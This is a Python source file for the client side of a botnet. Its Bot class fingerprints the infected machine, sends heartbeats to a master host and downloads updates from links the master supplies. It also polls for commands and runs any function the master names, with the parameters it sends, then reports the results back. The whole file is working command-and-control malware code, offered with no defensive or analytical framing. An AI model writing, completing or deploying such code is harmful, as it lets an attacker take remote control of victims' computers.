from .communicator import Communicator
from . import functions as fun
import ast

class Bot:

    def __init__(self, master_host):
        self.machine_ip = fun.getIp()
        self.machine_name = fun.getMachineName()
        self.system_version = fun.getSysPlatform()
        self.botnet_version = fun.getVersion()
        self.install_folder = r'C:\ '
        self.comm = Communicator(master_host)
        

    def heartBeat(self, info=[]):
        return self.comm.sendHeartBeat(self.machine_name, self.machine_ip, self.system_version, self.botnet_version, info)

    def startUp(self):
        fun.createPath(self.install_folder)
        latest = self.comm.getLatestVersion()
        if latest['version'] > self.botnet_version:
            fun.downloadFile(latest['download_link'], self.install_folder , latest['download_link'].split('/')[-1])

        self.heartBeat()

    def lookForCommands(self):
        return self.comm.getCommands(self.machine_ip, self.botnet_version)

    def doCommand(self, cmd_id, cmd_type, parameters):
        func = getattr(fun, cmd_type)
        params = []
        if parameters != "":
            if ' ' in parameters:
                params = parameters.split(' ')


        for i, at in enumerate(params):
            if '[' in at:
                params[i] = ast.literal_eval(at)
            try:
                x = int(at)
                params[i] = x
            except ValueError:
                pass
        

        r = func(*params)

        if isinstance(r, list) or isinstance(r, str):
            status = 0 if r[0] else 1
            c = self.comm.sendCommandStatus(self.machine_ip, cmd_id, status, result=r)
            return True if c['status'] == status else False
        else:
            status = 0 if r else 1
            c = self.comm.sendCommandStatus(self.machine_ip, cmd_id, status)
            return True if c['status'] == status else False
